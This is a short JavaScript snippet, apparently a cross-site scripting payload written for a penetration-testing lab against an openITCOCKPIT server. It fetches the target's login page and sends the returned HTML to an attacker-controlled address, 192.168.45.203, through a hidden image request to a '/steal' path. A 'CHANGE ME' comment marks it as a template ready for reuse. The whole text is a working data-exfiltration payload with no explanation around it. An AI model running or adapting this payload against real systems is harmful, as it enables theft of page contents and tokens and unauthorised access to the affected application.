fetch('https://openitcockpit/login/login')
  .then(r => r.text())
  .then(html => {
    new Image().src = 'https://192.168.45.203:80/steal?data=' + encodeURIComponent(html); // CHANGE ME
  });
